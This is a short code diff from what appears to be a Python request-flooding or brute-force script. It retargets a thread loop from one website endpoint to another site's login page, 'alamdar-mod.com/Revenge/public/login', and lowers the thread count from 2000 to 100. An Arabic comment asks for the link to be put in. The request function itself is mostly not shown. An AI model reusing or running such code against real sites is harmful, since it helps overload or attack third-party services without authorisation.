@@ -25,8 +25,8 @@ def chek(url):
             print("Request failed")
 
 def start_threads():
-    target_url = "https://adminpanel.in.net/chito/connect"  # ضع الرابط هنا
-    for _ in range(2000):
+    target_url = "https://alamdar-mod.com/Revenge/public/login"  # ضع الرابط هنا
+    for _ in range(100):
         thread = threading.Thread(target=chek, args=(target_url,))
         thread.daemon = True
         thread.start()
